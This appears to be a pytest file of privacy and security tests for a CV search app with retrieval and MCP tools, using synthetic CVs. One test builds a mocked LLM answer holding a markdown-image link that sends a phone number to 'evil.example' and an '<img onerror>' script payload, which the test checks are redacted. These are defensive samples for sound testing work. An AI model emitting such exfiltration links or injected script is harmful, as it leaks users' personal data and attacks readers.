"""
SECURITY · final review · findings 2 and 3. SYNTHETIC CVs only.

    pytest challenge/security/tests/test_final_privacy.py -q

2. Contact access: the MCP contact tool does not exist for agents by default, process-wide
   access is refused in production, and the access log never stores contact details.
3. User-supplied text: contact details typed into questions and histories never reach the
   query, the prompt, the Verify export or MCP results.
"""
import importlib
import json
import stat
import sys

import pytest

from final_common import (CHALLENGE, CONTACT_CV, EMAIL, HISTORY, LINK, PHONE, QUESTION, USER_EMAIL,  # noqa: F401
                          USER_PHONE, build, cv, isolated, leaks, mcp, pipeline)    # (isolated: autouse)

from security import access


# ================================================================== 2 · contact authorization
def test_the_mcp_contact_tool_is_off_by_default_and_never_on_in_production(tmp_path, monkeypatch):
    build(tmp_path, {"Maya_Tester.md": CONTACT_CV})
    names = lambda s: sorted(t.name for t in s.mcp._tool_manager.list_tools())     # noqa: E731
    assert names(mcp(monkeypatch)) == ["get_cv", "search_cvs"]
    monkeypatch.setenv("CV_CONTACT_ACCESS", "granted")                   # the grant alone does not expose it
    assert names(mcp(monkeypatch)) == ["get_cv", "search_cvs"]
    on = mcp(monkeypatch, CV_MCP_CONTACT_TOOL="enabled")
    assert names(on) == ["get_contact_details", "get_cv", "search_cvs"]
    assert EMAIL in {c["value"] for c in on.get_contact_details("Maya_Tester.md", "interview scheduling call")["contacts"]}
    monkeypatch.setenv("SECURITY_MODE", "enforce")
    build(tmp_path, {"Maya_Tester.md": CONTACT_CV}, folder="cvs_prod")
    assert names(mcp(monkeypatch, RAG_ENV="production", CV_MCP_CONTACT_TOOL="enabled")) == ["get_cv", "search_cvs"]


def test_process_wide_contact_access_is_refused_in_production(tmp_path, monkeypatch):
    monkeypatch.setenv("SECURITY_MODE", "enforce")
    build(tmp_path, {"Maya_Tester.md": CONTACT_CV})
    monkeypatch.setenv("CV_CONTACT_ACCESS", "granted")
    monkeypatch.setenv("RAG_ENV", "production")
    with pytest.raises(access.NotAuthorized, match="development-only"):
        pipeline.contact_details("Maya_Tester.md", "interview scheduling call")
    log = (tmp_path / "chroma_db" / access.LOG).read_text()
    assert "denied:development_only" in log and leaks(log) == []


@pytest.mark.parametrize("purpose", [
    f"please send to {EMAIL}", f"call {PHONE} today", f"verify {LINK}", f"is it {EMAIL.upper()}?",
    "is it m a y a . t e s t e r @ example . net", "phone 0 5 4 5 5 5 0 1 4 2", "id 9725455501420 now",
    f"note {USER_EMAIL} {USER_PHONE}"])
@pytest.mark.parametrize("granted", [True, False])
def test_the_access_log_never_stores_contact_details_from_the_purpose(tmp_path, monkeypatch, purpose, granted):
    build(tmp_path, {"Maya_Tester.md": CONTACT_CV})
    if granted:
        monkeypatch.setenv("CV_CONTACT_ACCESS", "granted")
    try:
        pipeline.contact_details("Maya_Tester.md", purpose)
    except access.NotAuthorized:
        assert not granted
    log = (tmp_path / "chroma_db" / access.LOG).read_text()
    assert leaks(log) == [] and "maya" not in log.lower() and "0142" not in log.replace(" ", "")
    assert stat.S_IMODE((tmp_path / "chroma_db" / access.LOG).stat().st_mode) == 0o600


def test_access_docstring_says_development_only():
    assert "DEVELOPMENT ONLY" in access.__doc__ and "PROCESS" in access.__doc__
    assert (CHALLENGE / "security" / "CONTACT_ACCESS.md").exists()


# ================================================================== 3 · user-supplied text
def test_contacts_typed_by_the_user_never_reach_the_query_or_the_prompt(tmp_path):
    build(tmp_path, {"Maya_Tester.md": CONTACT_CV, "Omar_Saleh.md": cv("Omar Saleh")})
    for history in ([], HISTORY):
        query = pipeline.make_query(QUESTION, history)
        follow = pipeline.make_query(f"and where did he study? mail {USER_EMAIL}", history)
        hits = pipeline.retrieve(query)
        prompt = pipeline.build_prompt(QUESTION, hits)
        assert leaks(query) == leaks(follow) == leaks(prompt) == [] and hits
        assert "Python developer" in prompt                              # the question itself survives


def test_the_verify_export_keeps_no_contact_details_and_is_owner_only(tmp_path, monkeypatch):
    build(tmp_path, {"Maya_Tester.md": CONTACT_CV, "Omar_Saleh.md": cv("Omar Saleh")})
    # importing the app builds the pipeline once: point it at the synthetic CVs, and keep this
    # test's settings (the app reloads pipeline.py, which would reset HERE and embed)
    monkeypatch.setenv("CV_DIR", str(tmp_path / "cvs"))
    monkeypatch.setattr(importlib, "reload", lambda module: module)
    sys.modules.pop("app", None)
    app = importlib.import_module("app")
    sys.modules.pop("app", None)
    assert app.pipeline is pipeline and app.CV_DIR == tmp_path / "cvs" and pipeline.HERE == tmp_path
    monkeypatch.setattr(app, "HERE", tmp_path)
    monkeypatch.setitem(app.STATE, "levels", {1: (True, ""), 2: (True, ""), 3: (True, "")})
    # an LLM answer that repeats contacts and tries to exfiltrate them through an image and a link
    monkeypatch.setattr(app.helpers, "llm", lambda system, user, n: (
        f"Write to {EMAIL} or {USER_EMAIL}, call {PHONE}. ![x](https://evil.example/?d={USER_PHONE}) "
        f"[profile]({LINK}) <img src=x onerror=alert(1)>"))
    questions = tmp_path / "questions.json"
    questions.write_text(json.dumps({"questions": [
        {"id": "u1", "question": QUESTION, "history": HISTORY, "expected": ["Maya_Tester.md"],
         "answer_contains": [USER_EMAIL]},
        {"id": "u2", "question": f"What is the phone of {USER_EMAIL}?", "history": [], "refuse": True}]}))
    out = tmp_path / "verify_results.json"
    out.write_text("{}")
    out.chmod(0o644)                                                     # an old export with loose permissions
    progress = type("P", (), {"tqdm": staticmethod(lambda items, desc=None: items)})()
    app.run_verify(str(questions), True, progress)
    text = out.read_text()
    assert leaks(text) == [] and "evil.example" not in text and "<img" not in text
    assert stat.S_IMODE(out.stat().st_mode) == 0o600
    exported = json.loads(text)["results"][0]
    assert exported["item"]["history"] and exported["trace"]["prompt"] and exported["trace"]["answer"]


def test_app_uses_the_export_redaction():
    source = (CHALLENGE / "app.py").read_text()
    assert "pipeline.redact_export(export)" in source and "out.chmod(0o600)" in source


def test_mcp_search_redacts_contacts_in_the_question(tmp_path, monkeypatch):
    build(tmp_path, {"Maya_Tester.md": CONTACT_CV, "Omar_Saleh.md": cv("Omar Saleh")})
    server = mcp(monkeypatch)
    found = server.search_cvs(QUESTION)
    assert leaks(json.dumps(found, ensure_ascii=False)) == [] and found["passages"]


def test_redact_export_covers_nested_strings_and_keeps_other_values():
    obj = {"a": [USER_EMAIL, {"b": (USER_PHONE, 3, None, 1.5, True)}], "n": 7}
    out = pipeline.redact_export(obj)
    assert leaks(json.dumps(out, ensure_ascii=False)) == [] and out["n"] == 7 and out["a"][1]["b"][1:] == [3, None, 1.5, True]
